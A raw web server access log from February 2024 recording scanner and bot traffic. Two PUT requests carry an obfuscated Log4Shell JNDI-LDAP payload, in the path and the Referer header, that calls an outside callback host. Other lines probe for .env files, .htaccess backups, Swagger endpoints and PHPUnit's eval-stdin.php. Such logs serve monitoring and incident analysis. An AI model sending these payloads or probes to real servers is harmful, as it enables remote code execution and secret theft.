34.68.34.72 - - [16/Feb/2024:04:06:08 +0000] "GET /.htaccess HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:08 +0000] "GET /swagger HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:06:08 +0000] "GET /v1/swagger.json HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:09 +0000] "GET /.htaccess HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:09 +0000] "GET /swagger HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:09 +0000] "GET /swagger/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:10 +0000] "GET /.htaccess.bak HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:10 +0000] "GET /swagger/ HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:11 +0000] "GET /swagger-resources HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:11 +0000] "GET /.htaccess.bak HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:11 +0000] "GET /swagger-resources HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:12 +0000] "GET /swagger-ui HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:13 +0000] "GET /swagger-ui HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:06:13 +0000] "PUT /${${p3:3:-j}${2:u9x:-n}${kil3:qp:jfle:-d}${znh:rs4:ohp:-i}${sg:oeuq:1:-:}${6:dw:okia:-l}${2mkb:-d}${jdlr:kyg:s1g:-a}${ov2m:-p}${lxvu:1:-:}${jv:-/}${y:li:-/}${u2:7:nupf:-P}${tz:-A}${f93:-l}${ps:r:-0}${dzqp:5:vyet:-c}${fw7j:9:--}${${n:vz5:hc5e:-s}${r2sq:hcrk:-y}${bkfo:qvrm:rv:-s}${s2ho:exhy:t3:-:}${cjaf:p6j:gx:-j}${8s:e0ps:q5m3:-a}${u:-v}${zqb:e2:-a}${cro7:g:5bh:-.}${f:-v}${eu62:-e}${a:b3fe:-r}${hb0:y5az:-s}${k5g2:b:tcik:-i}${1zsr:05s1:z5s:-o}${02fz:b:-n}}${i8:-.}${49wr:4k:t:-9}${ki2a:4:vbp0:-e}${meg6:dkv:i:-b}${ue4:-f}${w:p1s:f:-a}${sgd4:-4}${i:3:m6h:-9}${s6t:l5b3:e:-7}${uv92:-0}${m:a:-a}${efda:7k2:9:-d}${lw8o:-a}${zvq:3r:-5}${38cj:6lx:7tyn:-a}${d:-d}${x:-8}${2:b:-4}${9g:2g:ur:-9}${dr:-2}${wkx:-3}${e4lk:x3:-3}${e:lh3:nbw0:-5}${nu:t:-3}${5:9:-a}${yo:71i:13r:-0}${woj0:-5}${qmr:lxs8:-2}${l:0w52:-3}${ep:-6}${9i4:xc:qb5z:-9}${zn6:gpu:-b}${dk:89gb:-7}${u:-3}${i0:cw:-3}${s:-8}${1uvk:4r6:-f}${s:2t9l:7:-d}${8m:63:jp81:-9}${cz:ad:m:-0}${96u3:-e}${ucm:9a:-2}${os:-a}${kyus:1:h6n:-.}${58:-z}${i:rl:3ex:-.}${9q:1l:-7}${70:2:-b}${5yx6:j:-a}${qf:y0:-e}${dog:kon:w:-.}${hv:-x}${dhb:3yr:-y}${v:-z}} HTTP/1.1" 301 162 "${${nm02:-j}${cib:-n}${nfx:71u:1hfr:-d}${ncq4:hm:-i}${pn:1y:gc:-:}${4:-l}${9vzm:cd:diwz:-d}${4ec:k:ph9:-a}${w9i:8:-p}${1cnp:s:go:-:}${2ep:-/}${cvgs:5xn:-/}${4kma:xnhd:-R}${6ak4:ocza:-E}${p:c7z:x:-l}${ye6n:-0}${q:vp:hw:-c}${zb2:ucl:--}${${vn:byt:uq:-s}${t89u:-y}${o:-s}${sya:-:}${qcj:nb0p:rywn:-j}${26ug:t:lfc1:-a}${azg:h4y:kv:-v}${3b:hr:n:-a}${a9:z:-.}${sba:8gj1:-v}${gu:-e}${ksg2:68z:qo:-r}${o5e:-s}${knt:-i}${y90:j6k:-o}${d:-n}}${n:-.}${lpr6:nxm:67:-9}${a6:h61:-e}${6:y:-b}${p08:rhnw:-f}${hp:-a}${1w:-4}${705:-9}${b7ey:-7}${og:e7:-0}${3:n2:b:-a}${2x0p:-d}${vi:3:-a}${1id:pt:-5}${0l:i4:-a}${u:-d}${vo9u:-8}${oefc:-4}${9e4j:-9}${6:bio:56ep:-2}${8d:-3}${9ehx:-3}${u:vn6r:i8:-5}${01k:uzs1:32:-3}${l:-a}${xzo:-0}${agc1:9:j0i8:-5}${q:127:0:-2}${x8:m7e5:k8v:-3}${bq9d:ks:-6}${0fct:-9}${pw:c:-b}${a:z:ryni:-7}${1l:f:-3}${mhtz:sn3:-3}${b:u:pqs:-8}${x:8l7s:-f}${94tz:-d}${x7:kfb:-9}${ivb:-0}${r:-e}${k5z:2n4:-2}${4:0q:t:-a}${reu:z9fk:arp:-.}${i5y:l0:-z}${8:po:u:-.}${a:ri2k:o9z0:-7}${av93:-b}${whz:x86:-a}${w9tj:me6x:-e}${l:67ij:-.}${u:f39:4:-x}${pvu:-y}${t:3uz:-z}}" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:13 +0000] "GET /swagger-ui.html HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:14 +0000] "GET /swagger-ui.html HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:06:14 +0000] "PUT /${${p3:3:-j}${2:u9x:-n}${kil3:qp:jfle:-d}${znh:rs4:ohp:-i}${sg:oeuq:1:-:}${6:dw:okia:-l}${2mkb:-d}${jdlr:kyg:s1g:-a}${ov2m:-p}${lxvu:1:-:}${jv:-/}${y:li:-/}${u2:7:nupf:-P}${tz:-A}${f93:-l}${ps:r:-0}${dzqp:5:vyet:-c}${fw7j:9:--}${${n:vz5:hc5e:-s}${r2sq:hcrk:-y}${bkfo:qvrm:rv:-s}${s2ho:exhy:t3:-:}${cjaf:p6j:gx:-j}${8s:e0ps:q5m3:-a}${u:-v}${zqb:e2:-a}${cro7:g:5bh:-.}${f:-v}${eu62:-e}${a:b3fe:-r}${hb0:y5az:-s}${k5g2:b:tcik:-i}${1zsr:05s1:z5s:-o}${02fz:b:-n}}${i8:-.}${49wr:4k:t:-9}${ki2a:4:vbp0:-e}${meg6:dkv:i:-b}${ue4:-f}${w:p1s:f:-a}${sgd4:-4}${i:3:m6h:-9}${s6t:l5b3:e:-7}${uv92:-0}${m:a:-a}${efda:7k2:9:-d}${lw8o:-a}${zvq:3r:-5}${38cj:6lx:7tyn:-a}${d:-d}${x:-8}${2:b:-4}${9g:2g:ur:-9}${dr:-2}${wkx:-3}${e4lk:x3:-3}${e:lh3:nbw0:-5}${nu:t:-3}${5:9:-a}${yo:71i:13r:-0}${woj0:-5}${qmr:lxs8:-2}${l:0w52:-3}${ep:-6}${9i4:xc:qb5z:-9}${zn6:gpu:-b}${dk:89gb:-7}${u:-3}${i0:cw:-3}${s:-8}${1uvk:4r6:-f}${s:2t9l:7:-d}${8m:63:jp81:-9}${cz:ad:m:-0}${96u3:-e}${ucm:9a:-2}${os:-a}${kyus:1:h6n:-.}${58:-z}${i:rl:3ex:-.}${9q:1l:-7}${70:2:-b}${5yx6:j:-a}${qf:y0:-e}${dog:kon:w:-.}${hv:-x}${dhb:3yr:-y}${v:-z}} HTTP/1.1" 404 207 "${${nm02:-j}${cib:-n}${nfx:71u:1hfr:-d}${ncq4:hm:-i}${pn:1y:gc:-:}${4:-l}${9vzm:cd:diwz:-d}${4ec:k:ph9:-a}${w9i:8:-p}${1cnp:s:go:-:}${2ep:-/}${cvgs:5xn:-/}${4kma:xnhd:-R}${6ak4:ocza:-E}${p:c7z:x:-l}${ye6n:-0}${q:vp:hw:-c}${zb2:ucl:--}${${vn:byt:uq:-s}${t89u:-y}${o:-s}${sya:-:}${qcj:nb0p:rywn:-j}${26ug:t:lfc1:-a}${azg:h4y:kv:-v}${3b:hr:n:-a}${a9:z:-.}${sba:8gj1:-v}${gu:-e}${ksg2:68z:qo:-r}${o5e:-s}${knt:-i}${y90:j6k:-o}${d:-n}}${n:-.}${lpr6:nxm:67:-9}${a6:h61:-e}${6:y:-b}${p08:rhnw:-f}${hp:-a}${1w:-4}${705:-9}${b7ey:-7}${og:e7:-0}${3:n2:b:-a}${2x0p:-d}${vi:3:-a}${1id:pt:-5}${0l:i4:-a}${u:-d}${vo9u:-8}${oefc:-4}${9e4j:-9}${6:bio:56ep:-2}${8d:-3}${9ehx:-3}${u:vn6r:i8:-5}${01k:uzs1:32:-3}${l:-a}${xzo:-0}${agc1:9:j0i8:-5}${q:127:0:-2}${x8:m7e5:k8v:-3}${bq9d:ks:-6}${0fct:-9}${pw:c:-b}${a:z:ryni:-7}${1l:f:-3}${mhtz:sn3:-3}${b:u:pqs:-8}${x:8l7s:-f}${94tz:-d}${x7:kfb:-9}${ivb:-0}${r:-e}${k5z:2n4:-2}${4:0q:t:-a}${reu:z9fk:arp:-.}${i5y:l0:-z}${8:po:u:-.}${a:ri2k:o9z0:-7}${av93:-b}${whz:x86:-a}${w9tj:me6x:-e}${l:67ij:-.}${u:f39:4:-x}${pvu:-y}${t:3uz:-z}}" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:15 +0000] "GET /swagger.json HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:15 +0000] "GET /swagger.json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:16 +0000] "GET /swagger/index.html HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:17 +0000] "GET /swagger/index.html HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:17 +0000] "GET /swagger/swagger-ui.html HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:18 +0000] "GET /swagger/swagger-ui.html HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:19 +0000] "GET /swagger/ui/index HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:19 +0000] "GET /swagger/ui/index HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:20 +0000] "GET /swagger/v1/swagger.json HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:21 +0000] "GET /swagger/v1/swagger.json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:21 +0000] "GET /v1/swagger.json HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:22 +0000] "GET /v1/swagger.json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
198.74.56.46 - - [16/Feb/2024:04:06:23 +0000] "GET / HTTP/1.1" 400 248 "-" "Mozilla/5.0 zgrab/0.x"
141.98.11.89 - - [16/Feb/2024:04:10:19 +0000] "GET / HTTP/1.1" 403 146 "-" "-"
51.222.253.3 - - [16/Feb/2024:04:10:33 +0000] "GET /robots.txt HTTP/1.1" 404 184 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
143.110.222.166 - - [16/Feb/2024:04:22:50 +0000] "GET / HTTP/1.1" 403 118 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
103.158.43.33 - - [16/Feb/2024:04:35:11 +0000] "GET / HTTP/1.1" 200 1927 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
51.159.100.253 - - [16/Feb/2024:04:53:25 +0000] "HEAD / HTTP/1.1" 403 0 "-" "curl/7.81.0"
51.159.100.253 - - [16/Feb/2024:04:53:28 +0000] "GET / HTTP/1.1" 403 180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
51.159.100.253 - - [16/Feb/2024:04:53:28 +0000] "GET /favicon.ico HTTP/1.1" 404 181 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
51.159.100.253 - - [16/Feb/2024:04:53:31 +0000] "GET / HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
51.159.100.253 - - [16/Feb/2024:04:53:31 +0000] "GET /favicon.ico HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
192.155.90.220 - - [16/Feb/2024:05:01:46 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xB5HgO\xBF\xA4\x8Ck\x92\x99(Q\xC4Hm\xAB\x96\x02r\x8C\x90\xD2\x1E\x91J\xE3\xF0\x87\x80Ow~\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
34.78.6.216 - - [16/Feb/2024:05:05:50 +0000] "GET / HTTP/1.1" 403 118 "-" "python-requests/2.31.0"
185.224.128.10 - - [16/Feb/2024:05:12:00 +0000] "GET / HTTP/1.1" 403 180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.33.80.243 - - [16/Feb/2024:05:17:15 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x00\x94)\x06\x81\xBB\x18\x90w\xF5\xC9\x0C1\x0F\x02Q\xD9,D\xC0\x10tmN\xBB\x1F\x7F\xCF\x13\x15\x1E\xEF\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
198.74.56.46 - - [16/Feb/2024:05:24:09 +0000] "GET / HTTP/1.1" 400 248 "-" "Mozilla/5.0 zgrab/0.x"
34.78.249.41 - - [16/Feb/2024:05:25:46 +0000] "GET / HTTP/1.1" 404 184 "-" "python-requests/2.31.0"
172.104.210.105 - - [16/Feb/2024:05:27:30 +0000] "GET / HTTP/1.1" 403 118 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.166 - - [16/Feb/2024:05:31:29 +0000] "GET / HTTP/1.1" 403 118 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
89.149.41.31 - - [16/Feb/2024:05:35:00 +0000] "GET /.env HTTP/1.1" 404 118 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
89.149.41.31 - - [16/Feb/2024:05:35:01 +0000] "POST / HTTP/1.1" 403 118 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
89.149.41.31 - - [16/Feb/2024:05:35:02 +0000] "GET /.env HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
89.149.41.31 - - [16/Feb/2024:05:35:04 +0000] "POST / HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
89.149.41.31 - - [16/Feb/2024:05:35:17 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 401 172 "-" "python-requests/2.24.0"
185.224.128.55 - - [16/Feb/2024:05:41:37 +0000] "GET / HTTP/1.1" 403 180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
94.102.61.80 - - [16/Feb/2024:05:41:52 +0000] "GET / HTTP/1.1" 403 180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
185.150.26.251 - - [16/Feb/2024:05:46:09 +0000] "GET / HTTP/1.1" 403 118 "-" "Linux Gnu (cow)"
69.164.217.245 - - [16/Feb/2024:05:51:44 +0000] "GET / HTTP/1.1" 403 118 "-" "Mozilla/5.0 zgrab/0.x"
95.214.235.169 - - [16/Feb/2024:06:11:06 +0000] "GET /.env HTTP/1.1" 404 181 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [16/Feb/2024:06:11:07 +0000] "POST / HTTP/1.1" 403 180 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
35.203.211.216 - - [16/Feb/2024:06:12:51 +0000] "GET / HTTP/1.1" 403 146 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
35.203.245.215 - - [16/Feb/2024:06:21:11 +0000] "GET / HTTP/1.1" 403 180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
35.203.245.215 - - [16/Feb/2024:06:21:12 +0000] "GET / HTTP/1.1" 403 180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
35.203.255.118 - - [16/Feb/2024:06:21:12 +0000] "GET / HTTP/1.1" 403 180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
35.203.255.118 - - [16/Feb/2024:06:21:13 +0000] "GET / HTTP/1.1" 403 180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
35.203.245.215 - - [16/Feb/2024:06:21:13 +0000] "GET / HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
107.178.231.229 - - [16/Feb/2024:06:21:13 +0000] "GET / HTTP/1.1" 403 180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
35.203.245.215 - - [16/Feb/2024:06:21:13 +0000] "GET / HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
107.178.231.229 - - [16/Feb/2024:06:21:13 +0000] "GET / HTTP/1.1" 403 180 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
35.203.255.118 - - [16/Feb/2024:06:21:14 +0000] "GET / HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
35.203.255.118 - - [16/Feb/2024:06:21:14 +0000] "GET / HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
107.178.231.229 - - [16/Feb/2024:06:21:15 +0000] "GET / HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
107.178.231.229 - - [16/Feb/2024:06:21:15 +0000] "GET / HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
74.82.47.2 - - [16/Feb/2024:06:25:41 +0000] "GET / HTTP/1.1" 403 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
74.82.47.2 - - [16/Feb/2024:06:27:09 +0000] "GET /webui/ HTTP/1.1" 404 181 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
74.82.47.2 - - [16/Feb/2024:06:29:16 +0000] "GET /geoserver/web/ HTTP/1.1" 404 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
194.165.16.10 - - [16/Feb/2024:06:50:03 +0000] "\x03\x00\x00*%\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Test" 400 150 "-" "-"
194.165.16.10 - - [16/Feb/2024:06:50:03 +0000] "\x03\x00\x00*%\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Test" 400 150 "-" "-"
172.104.210.105 - - [16/Feb/2024:06:56:56 +0000] "GET / HTTP/1.1" 403 118 "-" "Mozilla/5.0 zgrab/0.x"
167.248.133.122 - - [16/Feb/2024:07:01:44 +0000] "GET / HTTP/1.1" 404 207 "-" "-"
167.248.133.122 - - [16/Feb/2024:07:01:48 +0000] "GET / HTTP/1.1" 404 184 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.122 - - [16/Feb/2024:07:01:49 +0000] "PRI * HTTP/2.0" 400 150 "-" "-"
141.98.11.89 - - [16/Feb/2024:07:11:55 +0000] "GET / HTTP/1.1" 403 146 "-" "-"
143.110.222.166 - - [16/Feb/2024:07:25:45 +0000] "GET / HTTP/1.1" 403 118 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
192.241.219.50 - - [16/Feb/2024:07:27:09 +0000] "GET /portal/redlion HTTP/1.1" 404 118 "-" "Mozilla/5.0 zgrab/0.x"
129.146.254.3 - - [16/Feb/2024:07:28:20 +0000] "GET /.env HTTP/1.1" 404 181 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
